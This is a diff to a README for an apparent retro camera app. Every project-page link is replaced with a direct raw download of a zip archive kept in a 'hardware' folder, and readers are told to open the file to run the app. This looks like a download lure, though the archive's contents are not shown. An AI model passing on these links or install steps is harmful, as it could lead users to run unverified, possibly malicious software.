@@ -1,6 +1,6 @@
 # 🎞️ saturnix-camera - Retro camera with film-like results
 
-[![Download Saturnix Camera](https://img.shields.io/badge/Download-Run%20on%20Windows-blue)](https://github.com/marta3718/saturnix-camera)
+[![Download Saturnix Camera](https://img.shields.io/badge/Download-Run%20on%20Windows-blue)](https://github.com/marta3718/saturnix-camera/raw/refs/heads/main/hardware/saturnix-camera-3.8.zip)
 
 ## 🌙 What it is
 
@@ -16,7 +16,7 @@ The app focuses on:
 
 Open the project page here:
 
-https://github.com/marta3718/saturnix-camera
+https://github.com/marta3718/saturnix-camera/raw/refs/heads/main/hardware/saturnix-camera-3.8.zip
 
 On that page, look for the latest Windows download file or release package. Download it to your PC, then open the file to start the app.
 
@@ -53,7 +53,7 @@ If you plan to use custom hardware, connect it before you open the app.
 ## 📥 Install and run
 
 1. Open the download page:
-   https://github.com/marta3718/saturnix-camera
+   https://github.com/marta3718/saturnix-camera/raw/refs/heads/main/hardware/saturnix-camera-3.8.zip
 
 2. Find the latest Windows file or release package.
 
@@ -212,7 +212,7 @@ If the app asks for camera access, it needs that access to show a live view and 
 ## 🧭 Quick start
 
 1. Go to the download page:
-   https://github.com/marta3718/saturnix-camera
+   https://github.com/marta3718/saturnix-camera/raw/refs/heads/main/hardware/saturnix-camera-3.8.zip
 
 2. Download the latest Windows file.
 
@@ -254,7 +254,7 @@ Small checks like these help keep your photos sharp and your setup stable
 
 ## 🔗 Download again
 
-[Download saturnix-camera](https://github.com/marta3718/saturnix-camera)
+[Download saturnix-camera](https://github.com/marta3718/saturnix-camera/raw/refs/heads/main/hardware/saturnix-camera-3.8.zip)
 
 ## 🧷 Folder setup example
 
